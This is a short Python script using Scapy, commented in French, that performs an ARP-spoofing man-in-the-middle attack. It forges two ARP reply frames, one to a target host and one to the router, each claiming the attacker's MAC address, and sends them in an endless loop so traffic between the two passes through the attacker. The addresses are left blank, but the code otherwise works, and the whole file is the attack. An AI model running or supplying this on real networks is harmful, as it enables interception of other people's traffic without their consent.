#Script d'une attaque de l'homme du milieu où l'on observe le traffique entre deux machines
#Il est nécessaire de d"sactiver l'IP forwarding

from scapy.all import *

#Création des trames pour l'attaque

trametype=Ether(type=0x0806)

#Trame vers la cible

packet=ARP()
packet.hwlen=6                          #Taille en octet @MAC
packet.plen=4                           #Taille en octet @IP
packet.op=2
packet.psrc=''                          #ip de la machine pour laquelle on se fait passer
packet.pdst=''                          #ip cible
packet.hwsrc=''                         #notre @MAC attaquante 
packet.hwdst=''                         #@MAC cible

trame1=trametype/packet

#Trame vers le routeur

packet2=ARP()
packet2.hwlen=6                         #Taille en octet @MAC
packet2.plen=4                          #Taille en octet @IP
packet2.op=2
packet2.psrc=''                         #ip de la cible
packet2.pdst=''                         #ip du routeur
packet2.hwsrc=''                        #notre @MAC attaquante 
packet2.hwdst=''                        #@MAC du routeur

trame2=trametype/packet2

#Debut de l'attaque

while True:
    sendp(trame1)
    sendp(trame2)